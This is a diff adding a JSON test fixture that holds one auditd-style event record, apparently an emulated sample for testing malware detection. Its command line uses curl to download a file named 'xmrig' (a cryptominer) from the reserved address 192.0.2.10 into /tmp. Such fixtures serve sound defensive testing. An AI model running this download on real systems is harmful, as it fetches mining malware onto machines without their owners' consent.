@@ -1,0 +1,9 @@
+[
+  {
+    "source": "auditd",
+    "image": "/usr/bin/curl",
+    "commandLine": "curl -s --max-time 2 http://192.0.2.10/xmrig -o /tmp/xmrig-emul",
+    "user": "1000",
+    "currentDirectory": "/home/u"
+  }
+]
